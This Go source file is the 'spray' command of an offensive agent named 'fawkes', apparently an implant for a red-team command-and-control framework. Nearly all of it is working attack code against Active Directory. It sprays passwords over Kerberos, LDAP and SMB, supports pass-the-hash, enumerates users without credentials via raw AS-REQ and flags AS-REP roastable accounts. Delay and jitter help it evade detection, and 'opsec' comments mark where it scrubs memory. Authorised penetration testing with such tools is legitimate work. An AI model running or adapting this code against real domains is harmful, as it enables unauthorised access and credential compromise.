package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
	"github.com/jcmturner/gokrb5/v8/client"
	krbconfig "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type SprayCommand struct{}

func (c *SprayCommand) Name() string { return "spray" }
func (c *SprayCommand) Description() string {
	return "Password spray or user enumeration against AD via Kerberos, LDAP, or SMB (T1110.003, T1589.002)"
}

type sprayArgs struct {
	Action   string `json:"action"`   // kerberos, ldap, smb, enumerate
	Server   string `json:"server"`   // target DC/server
	Domain   string `json:"domain"`   // domain name
	Users    string `json:"users"`    // newline-separated usernames
	Password string `json:"password"` // password to spray (not required for enumerate)
	Hash     string `json:"hash"`     // NTLM hash for SMB spray (pass-the-hash)
	Delay    int    `json:"delay"`    // delay between attempts in ms (default: 0)
	Jitter   int    `json:"jitter"`   // jitter percentage 0-100 (default: 0)
	Port     int    `json:"port"`     // optional custom port
	UseTLS   bool   `json:"use_tls"`  // LDAPS
}

type sprayResult struct {
	Username string `json:"username"`
	Success  bool   `json:"success"`
	Message  string `json:"message"`
}

func (c *SprayCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -action kerberos -server <DC> -domain <DOMAIN> -users <user1\\nuser2> -password <pass>")
	}

	var args sprayArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	defer structs.ZeroString(&args.Password)
	defer structs.ZeroString(&args.Hash)

	if args.Action == "" {
		args.Action = "kerberos"
	}

	// Validate required params — enumerate doesn't need password
	if args.Server == "" || args.Domain == "" || args.Users == "" {
		return errorResult("Error: server, domain, and users are required")
	}
	if args.Action != "enumerate" && args.Password == "" && args.Hash == "" {
		return errorResult("Error: password (or hash for SMB) is required for spray actions (not required for enumerate)")
	}
	if args.Hash != "" && args.Action != "smb" {
		return errorResult("Error: hash-based spray is only supported for SMB action")
	}

	// Parse user list
	users := parseSprayUsers(args.Users)
	if len(users) == 0 {
		return errorResult("Error: no valid usernames provided")
	}

	// Clamp jitter
	if args.Jitter < 0 {
		args.Jitter = 0
	}
	if args.Jitter > 100 {
		args.Jitter = 100
	}

	switch args.Action {
	case "kerberos":
		return sprayKerberos(args, users)
	case "ldap":
		return sprayLDAP(args, users)
	case "smb":
		return spraySMB(args, users)
	case "enumerate":
		return sprayEnumerate(args, users)
	default:
		return errorf("Unknown action: %s. Use: kerberos, ldap, smb, enumerate", args.Action)
	}
}

func parseSprayUsers(input string) []string {
	var users []string
	for _, line := range strings.Split(input, "\n") {
		u := strings.TrimSpace(line)
		if u != "" {
			users = append(users, u)
		}
	}
	return users
}

func sprayDelay(args sprayArgs) {
	if args.Delay <= 0 {
		return
	}
	delay := args.Delay
	if args.Jitter > 0 {
		jitterRange := delay * args.Jitter / 100
		delay = delay - jitterRange + rand.Intn(2*jitterRange+1)
		if delay < 0 {
			delay = 0
		}
	}
	time.Sleep(time.Duration(delay) * time.Millisecond)
}

func sprayFormatResults(action string, args sprayArgs, users []string, results []sprayResult) structs.CommandResult {
	data, err := json.Marshal(results)
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return successResult(string(data))
}

// --- Kerberos spray ---

func sprayKerberos(args sprayArgs, users []string) structs.CommandResult {
	realm := strings.ToUpper(args.Domain)
	krb5Conf := buildKrb5Config(realm, args.Server)
	cfg, err := krbconfig.NewFromString(krb5Conf)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	results := make([]sprayResult, 0, len(users))
	for i, user := range users {
		if i > 0 {
			sprayDelay(args)
		}

		cl := client.NewWithPassword(user, realm, args.Password, cfg, client.DisablePAFXFAST(true))
		err := cl.Login()

		r := sprayResult{Username: user}
		if err == nil {
			r.Success = true
			r.Message = "Authentication successful"
			cl.Destroy()
		} else {
			r.Message = classifyKrbError(err)
			// Stop if we detect lockout
			if strings.Contains(r.Message, "REVOKED") {
				results = append(results, r)
				results = append(results, sprayResult{
					Username: "(stopped)",
					Message:  "Account lockout detected — aborting spray to prevent further lockouts",
				})
				return sprayFormatResults("kerberos", args, users, results)
			}
		}
		results = append(results, r)
	}

	return sprayFormatResults("kerberos", args, users, results)
}

func classifyKrbError(err error) string {
	errStr := err.Error()
	// gokrb5 error strings contain the KRB error code
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED") || strings.Contains(errStr, "error_code: 24"):
		return "Pre-auth failed (wrong password)"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN") || strings.Contains(errStr, "error_code: 6"):
		return "Principal unknown (user doesn't exist)"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED") || strings.Contains(errStr, "error_code: 18"):
		return "Client REVOKED (account disabled/locked)"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED") || strings.Contains(errStr, "error_code: 23"):
		return "Password expired (credential valid but expired)"
	case strings.Contains(errStr, "KDC_ERR_POLICY") || strings.Contains(errStr, "error_code: 12"):
		return "Policy violation (logon hours/workstation restriction)"
	default:
		return fmt.Sprintf("Error: %v", err)
	}
}

// --- LDAP spray ---

func sprayLDAP(args sprayArgs, users []string) structs.CommandResult {
	port := args.Port
	if port <= 0 {
		if args.UseTLS {
			port = 636
		} else {
			port = 389
		}
	}

	results := make([]sprayResult, 0, len(users))
	for i, user := range users {
		if i > 0 {
			sprayDelay(args)
		}

		r := sprayResult{Username: user}

		conn, err := ldapDial(args.Server, port, args.UseTLS)
		if err != nil {
			r.Message = fmt.Sprintf("Connection error: %v", err)
			results = append(results, r)
			continue
		}

		// Attempt bind with UPN format
		upn := fmt.Sprintf("%s@%s", user, args.Domain)
		err = conn.Bind(upn, args.Password)
		conn.Close()

		if err == nil {
			r.Success = true
			r.Message = "Bind successful"
		} else {
			r.Message = classifyLDAPError(err)
			if strings.Contains(r.Message, "locked") {
				results = append(results, r)
				results = append(results, sprayResult{
					Username: "(stopped)",
					Message:  "Account lockout detected — aborting spray",
				})
				return sprayFormatResults("ldap", args, users, results)
			}
		}
		results = append(results, r)
	}

	return sprayFormatResults("ldap", args, users, results)
}

func classifyLDAPError(err error) string {
	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "data 52e"):
		return "Invalid credentials (wrong password)"
	case strings.Contains(errStr, "data 525"):
		return "User not found"
	case strings.Contains(errStr, "data 775"):
		return "Account locked out"
	case strings.Contains(errStr, "data 533"):
		return "Account disabled"
	case strings.Contains(errStr, "data 532"):
		return "Password expired (credential valid but expired)"
	case strings.Contains(errStr, "data 701"):
		return "Account expired"
	case strings.Contains(errStr, "data 773"):
		return "Must change password (credential valid)"
	default:
		return fmt.Sprintf("Error: %v", err)
	}
}

// --- SMB spray ---

func spraySMB(args sprayArgs, users []string) structs.CommandResult {
	port := args.Port
	if port <= 0 {
		port = 445
	}

	results := make([]sprayResult, 0, len(users))
	for i, user := range users {
		if i > 0 {
			sprayDelay(args)
		}

		r := sprayResult{Username: user}

		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Server, port), 10*time.Second)
		if err != nil {
			r.Message = fmt.Sprintf("Connection error: %v", err)
			results = append(results, r)
			continue
		}

		initiator := &smb2.NTLMInitiator{
			User:   user,
			Domain: args.Domain,
		}
		if args.Hash != "" {
			hashBytes, err := smbDecodeHash(args.Hash)
			if err != nil {
				conn.Close()
				r.Message = fmt.Sprintf("Invalid hash: %v", err)
				results = append(results, r)
				continue
			}
			initiator.Hash = hashBytes
		} else {
			initiator.Password = args.Password
		}
		d := &smb2.Dialer{Initiator: initiator}

		session, err := d.Dial(conn)
		if err != nil {
			conn.Close()
			r.Message = classifySMBError(err)
			if strings.Contains(r.Message, "locked") {
				structs.ZeroBytes(initiator.Hash)
				results = append(results, r)
				results = append(results, sprayResult{
					Username: "(stopped)",
					Message:  "Account lockout detected — aborting spray",
				})
				return sprayFormatResults("smb", args, users, results)
			}
		} else {
			r.Success = true
			r.Message = "SMB authentication successful"
			_ = session.Logoff()
		}
		structs.ZeroBytes(initiator.Hash)
		results = append(results, r)
	}

	return sprayFormatResults("smb", args, users, results)
}

func classifySMBError(err error) string {
	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "STATUS_LOGON_FAILURE"):
		return "Logon failure (wrong password)"
	case strings.Contains(errStr, "STATUS_ACCOUNT_LOCKED_OUT"):
		return "Account locked out"
	case strings.Contains(errStr, "STATUS_ACCOUNT_DISABLED"):
		return "Account disabled"
	case strings.Contains(errStr, "STATUS_PASSWORD_EXPIRED"):
		return "Password expired (credential valid but expired)"
	case strings.Contains(errStr, "STATUS_PASSWORD_MUST_CHANGE"):
		return "Must change password (credential valid)"
	case strings.Contains(errStr, "STATUS_ACCOUNT_RESTRICTION"):
		return "Account restriction (logon hours/workstation)"
	default:
		return fmt.Sprintf("Error: %v", err)
	}
}

// --- Kerberos user enumeration (no credentials needed) ---

// sprayEnumEntry represents a user enumeration result for JSON output
type sprayEnumEntry struct {
	Username string `json:"username"`
	Status   string `json:"status"` // "exists", "asrep", "not_found", or error string
	Message  string `json:"message"`
}

func sprayEnumerate(args sprayArgs, users []string) structs.CommandResult {
	realm := strings.ToUpper(args.Domain)
	krb5Conf := buildKrb5Config(realm, args.Server)
	cfg, err := krbconfig.NewFromString(krb5Conf)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	var entries []sprayEnumEntry
	for i, user := range users {
		if i > 0 {
			sprayDelay(args)
		}

		status := enumKerberosUser(cfg, realm, args.Server, user)
		var message string
		switch status {
		case "exists":
			message = "Pre-auth required"
		case "asrep":
			message = "NO PRE-AUTH — AS-REP roastable"
		case "not_found":
			message = "User not found"
		default:
			message = status
		}
		entries = append(entries, sprayEnumEntry{
			Username: user,
			Status:   status,
			Message:  message,
		})
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return successResult(string(data))
}

func enumKerberosUser(cfg *krbconfig.Config, realm, kdc, username string) string {
	// Build AS-REQ without pre-auth data (same technique as AS-REP roasting)
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}

	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	asReq.PAData = types.PADataSequence{}

	reqBytes, err := asReq.Marshal()
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	defer structs.ZeroBytes(reqBytes) // opsec: zero Kerberos AS-REQ bytes

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:88", kdc), 10*time.Second)
	if err != nil {
		return fmt.Sprintf("connection error: %v", err)
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Sprintf("deadline error: %v", err)
	}

	// Send length-prefixed AS-REQ
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return fmt.Sprintf("send error: %v", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return fmt.Sprintf("send error: %v", err)
	}

	// Read response
	if _, err := sprayReadFull(conn, lenBuf); err != nil {
		return fmt.Sprintf("read error: %v", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1<<20 {
		return "response too large"
	}

	respBytes := make([]byte, respLen)
	if _, err := sprayReadFull(conn, respBytes); err != nil {
		return fmt.Sprintf("read error: %v", err)
	}
	defer structs.ZeroBytes(respBytes) // opsec: zero Kerberos KDC response

	// Try to unmarshal as AS-REP (user exists AND has no pre-auth)
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBytes); err == nil {
		return "asrep" // User exists and is AS-REP roastable
	}

	// Must be a KRBError — check the error code
	// KRBError is application tag 30 (0x7e in DER)
	// The error code is deep in the ASN.1 structure; parse the raw bytes
	errCode := extractKrbErrorCode(respBytes)
	switch errCode {
	case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
		return "not_found"
	case 24: // KDC_ERR_PREAUTH_FAILED
		return "exists" // This shouldn't happen without creds, but handle it
	case 25: // KDC_ERR_PREAUTH_REQUIRED
		return "exists"
	case 18: // KDC_ERR_CLIENT_REVOKED
		return "disabled/locked"
	default:
		return fmt.Sprintf("krb_error_%d", errCode)
	}
}

// extractKrbErrorCode extracts the error-code from a raw KRB-ERROR ASN.1 message.
// KRB-ERROR ::= [APPLICATION 30] SEQUENCE { ... error-code [6] Int32, ... }
func extractKrbErrorCode(data []byte) int {
	// Quick scan: find context tag [6] (0xa6) followed by length and INTEGER (0x02)
	for i := 0; i < len(data)-4; i++ {
		if data[i] == 0xa6 {
			// Context tag [6] — next byte is length, then INTEGER tag
			innerStart := i + 2
			if innerStart < len(data) && data[innerStart] == 0x02 {
				// INTEGER tag — next byte is length, then value
				intLen := int(data[innerStart+1])
				valStart := innerStart + 2
				if valStart+intLen <= len(data) && intLen <= 4 {
					val := 0
					for j := 0; j < intLen; j++ {
						val = (val << 8) | int(data[valStart+j])
					}
					return val
				}
			}
		}
	}
	return -1
}

func sprayReadFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
